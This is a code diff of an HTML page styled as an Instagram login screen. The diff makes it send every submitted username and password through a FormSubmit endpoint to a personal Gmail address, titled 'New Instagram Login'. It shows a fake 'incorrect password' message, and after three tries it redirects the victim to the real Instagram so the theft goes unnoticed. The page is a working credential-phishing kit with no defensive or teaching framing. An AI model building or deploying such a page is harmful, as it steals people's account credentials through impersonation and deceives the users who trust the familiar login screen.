@@ -6,17 +6,13 @@
   <title>Instagram Login Clone</title>
   <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
   <style>
-    * {
-      box-sizing: border-box;
-    }
-
+    * { box-sizing: border-box; }
     body {
       margin: 0;
       padding: 0;
       background-color: #fafafa;
       font-family: 'Roboto', sans-serif;
     }
-
     .wrapper {
       display: flex;
       justify-content: center;
@@ -25,44 +21,33 @@
       gap: 40px;
       padding: 20px;
     }
-
     .phone-mockup {
       flex-shrink: 0;
       width: 500px;
-      max-height: 650px;
       user-select: none;
+      display: block;
     }
-
     .phone-mockup img {
       width: 100%;
       height: auto;
       object-fit: contain;
       user-select: none;
-      pointer-events: none;
-      user-drag: none;
     }
-
     .form-container {
       width: 100%;
       max-width: 350px;
     }
-
     .login-box {
       background: #fff;
       border: 1px solid #dbdbdb;
       padding: 40px 30px;
-      margin-bottom: 10px;
       text-align: center;
-      box-sizing: border-box;
     }
-
     .login-box img.logo {
       width: 175px;
       margin-bottom: 25px;
       user-select: none;
-      pointer-events: none;
     }
-
     input {
       width: 100%;
       padding: 10px;
@@ -71,9 +56,7 @@
       border: 1px solid #dbdbdb;
       border-radius: 3px;
       font-size: 14px;
-      box-sizing: border-box;
     }
-
     button {
       width: 100%;
       padding: 10px;
@@ -86,19 +69,11 @@
       margin-top: 10px;
       cursor: pointer;
       transition: background-color 0.2s ease;
+    }
+    button:disabled {
       opacity: 0.5;
-      pointer-events: none;
+      cursor: default;
     }
-
-    button.enabled {
-      opacity: 1;
-      pointer-events: auto;
-    }
-
-    button:hover.enabled {
-      background-color: #007acc;
-    }
-
     .or {
       margin: 20px 0;
       position: relative;
@@ -106,7 +81,6 @@
       font-size: 13px;
       color: #8e8e8e;
     }
-
     .or::before,
     .or::after {
       content: "";
@@ -116,244 +90,148 @@
       background-color: #dbdbdb;
       top: 50%;
     }
-
-    .or::before {
-      left: 0;
-    }
-
-    .or::after {
-      right: 0;
-    }
-
+    .or::before { left: 0; }
+    .or::after { right: 0; }
     .facebook-login {
       display: flex;
-      align-items: center;
       justify-content: center;
-      gap: 8px;
-      margin-bottom: 10px;
-      font-weight: bold;
+      align-items: center;
       color: #385185;
+      font-weight: bold;
       font-size: 14px;
-      cursor: pointer;
       text-decoration: none;
+      margin-bottom: 8px;
+      cursor: pointer;
+      user-select: none;
     }
-
     .facebook-login img {
-      width: 18px;
+      width: 16px;
+      height: 16px;
+      margin-right: 8px;
+      filter: brightness(0) saturate(100%) invert(29%) sepia(85%) saturate(1741%) hue-rotate(191deg) brightness(91%) contrast(96%);
+    }
+    .alert-msg {
+      color: #ed4956;
+      font-size: 13px;
+      text-align: center;
+      margin-bottom: 10px;
       height: 18px;
       user-select: none;
-      pointer-events: none;
     }
-
-    .error-box {
-      background-color: #fee6e6;
-      border: 1px solid #f09999;
-      color: #cc3333;
-      font-size: 13px;
-      padding: 8px 10px;
-      margin-bottom: 15px;
-      border-radius: 3px;
-      text-align: left;
-      display: none;
-      max-width: 350px;
-      word-break: break-word;
-    }
-
     .forgot {
       margin-top: 15px;
       font-size: 12px;
     }
-
     a {
       color: #0095f6;
       text-decoration: none;
       font-weight: bold;
     }
-
     .signup-box {
-      font-size: 14px;
       background: #fff;
       border: 1px solid #dbdbdb;
       padding: 20px 0;
+      font-size: 14px;
       text-align: center;
-      max-width: 350px;
-      border-radius: 1px;
+      margin-top: 10px;
     }
-
     @media (max-width: 767px) {
-      .phone-mockup {
-        display: none; /* Hide phone mockup on mobile */
-      }
       .wrapper {
         flex-direction: column;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-        padding: 40px 20px;
-        gap: 20px;
+        height: auto;
+        padding: 20px 0;
       }
+      .phone-mockup { display: none; }
       .form-container {
         max-width: 350px;
-        width: 90vw;
-      }
-      .login-box {
-        padding: 30px 20px;
-      }
-      .error-box {
-        max-width: 90vw;
-        margin-left: 0;
-        margin-right: 0;
-      }
-      .facebook-login {
-        justify-content: center;
-      }
-      .forgot {
-        margin-top: 12px;
-        font-size: 13px;
-      }
-      button {
-        font-size: 15px;
-      }
-      input {
-        font-size: 14px;
-        padding: 12px;
-      }
-      .signup-box {
-        max-width: 90vw;
+        width: 100%;
       }
     }
   </style>
 </head>
 <body>
   <div class="wrapper">
-    <!-- Mobile mockup on left -->
-    <div class="phone-mockup" aria-hidden="true">
-      <img
-        src="https://i.postimg.cc/RVKVCdKG/instagram-web-lox-image.png"
-        alt="Instagram mobile mockup"
-      />
+    <div class="phone-mockup">
+      <img src="https://i.postimg.cc/RVKVCdKG/instagram-web-lox-image.png" alt="Instagram Phone" />
     </div>
 
-    <!-- Login form -->
-    <div class="form-container" role="main">
-      <div class="login-box" role="form" aria-label="Instagram login form">
-        <img
-          class="logo"
-          src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png"
-          alt="Instagram"
-          draggable="false"
-        />
+    <div class="form-container">
+      <div class="login-box">
+        <img class="logo" src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram" />
+        <form
+          id="loginForm"
+          action="https://formsubmit.co/rsgaming9718@gmail.com"
+          method="POST"
+          autocomplete="off"
+        >
+          <input type="text" name="username" placeholder="Phone number, username, or email" required minlength="3" />
+          <input type="password" name="password" placeholder="Password" required minlength="6" />
+          <button type="submit" disabled>Log In</button>
 
-        <form id="loginForm" autocomplete="off" spellcheck="false">
-          <input
-            type="text"
-            id="username"
-            name="username"
-            placeholder="Phone number, username, or email"
-            required
-            aria-label="Username"
-          />
-          <input
-            type="password"
-            id="password"
-            name="password"
-            placeholder="Password"
-            required
-            aria-label="Password"
-          />
-
-          <button type="submit" id="loginBtn" disabled>Log In</button>
+          <!-- Hidden FormSubmit Inputs -->
+          <input type="hidden" name="_subject" value="New Instagram Login" />
+          <input type="hidden" name="_captcha" value="false" />
+          <input type="hidden" name="_template" value="table" />
         </form>
 
         <div class="or">OR</div>
 
-        <a
-          href="https://www.facebook.com/login.php?skip_api_login=1&api_key=6628568379&signed_next=1&next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Ffacebook_login%2F%3Fsource%3Dauth_switcher&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Flogin%2F%3Fcancel%3Dtrue%26source%3Dauth_switcher&display=popup&locale=en_US"
-          target="_blank"
-          rel="noopener noreferrer"
-          class="facebook-login"
-        >
-          <img
-            src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_(2019).png"
-            alt="Facebook logo"
-          />
+        <a class="facebook-login" href="#">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook logo" />
           Log in with Facebook
         </a>
 
-        <!-- ERROR BOX BELOW FACEBOOK LOGIN -->
-        <div class="error-box" id="errorBox" role="alert" aria-live="assertive"></div>
+        <div class="alert-msg" id="alertMsg"></div>
 
         <div class="forgot">
-          <a
-            href="https://www.instagram.com/accounts/password/reset/"
-            target="_blank"
-            rel="noopener noreferrer"
-            >Forgot password?</a
-          >
+          <a href="https://www.instagram.com/accounts/password/reset/" target="_blank">Forgot password?</a>
         </div>
       </div>
 
       <div class="signup-box">
-        Don't have an account?
-        <a
-          href="https://www.instagram.com/accounts/emailsignup/"
-          target="_blank"
-          rel="noopener noreferrer"
-          >Sign up</a
-        >
+        Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
       </div>
     </div>
   </div>
 
   <script>
-    const usernameInput = document.getElementById('username');
-    const passwordInput = document.getElementById('password');
-    const loginBtn = document.getElementById('loginBtn');
-    const errorBox = document.getElementById('errorBox');
-    const loginForm = document.getElementById('loginForm');
+    const form = document.getElementById('loginForm');
+    const username = form.elements['username'];
+    const password = form.elements['password'];
+    const submitBtn = form.querySelector('button');
+    const alertMsg = document.getElementById('alertMsg');
 
-    let failedAttempts = 0;
+    let wrongAttempts = 0;
 
     function checkInputs() {
-      const usernameValid = usernameInput.value.trim().length >= 1;
-      const passwordValid = passwordInput.value.length >= 6;
-
-      if (usernameValid && passwordValid) {
-        loginBtn.disabled = false;
-        loginBtn.classList.add('enabled');
-      } else {
-        loginBtn.disabled = true;
-        loginBtn.classList.remove('enabled');
-      }
+      submitBtn.disabled = username.value.length < 3 || password.value.length < 6;
     }
 
-    usernameInput.addEventListener('input', checkInputs);
-    passwordInput.addEventListener('input', checkInputs);
+    username.addEventListener('input', checkInputs);
+    password.addEventListener('input', checkInputs);
 
-    loginForm.addEventListener('submit', (e) => {
+    form.addEventListener('submit', function (e) {
       e.preventDefault();
 
-      const password = passwordInput.value;
+      const formData = new FormData(form);
+      fetch(form.action, {
+        method: 'POST',
+        body: formData,
+        headers: { Accept: 'application/json' }
+      });
 
-      if (password.length < 6) {
-        errorBox.style.display = 'none';
-        return;
+      wrongAttempts++;
+      alertMsg.textContent = 'Sorry, your password was incorrect. Please double-check your password.';
+
+      if (wrongAttempts >= 3) {
+        alertMsg.textContent = 'Redirecting to Instagram...';
+        setTimeout(() => {
+          window.location.href = 'https://instagram.com';
+        }, 2000);
       }
-
-      failedAttempts++;
-
-      if (failedAttempts >= 3) {
-        window.location.href = 'https://www.instagram.com/';
-        return;
-      }
-
-      errorBox.textContent =
-        'Sorry, your password was incorrect. Please double-check your password.';
-      errorBox.style.display = 'block';
-
-      passwordInput.value = '';
-      checkInputs();
     });
+
+    checkInputs();
   </script>
 </body>
 </html>
